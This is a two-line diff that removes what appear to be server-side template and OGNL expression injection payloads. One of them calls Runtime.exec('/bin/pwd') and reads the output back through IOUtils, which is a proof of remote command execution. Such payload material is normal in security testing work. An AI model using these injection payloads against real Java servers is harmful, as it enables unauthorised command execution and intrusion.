@@ -1,2 +1,0 @@
-#set($e="e")
-@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('/bin/pwd').getInputStream());
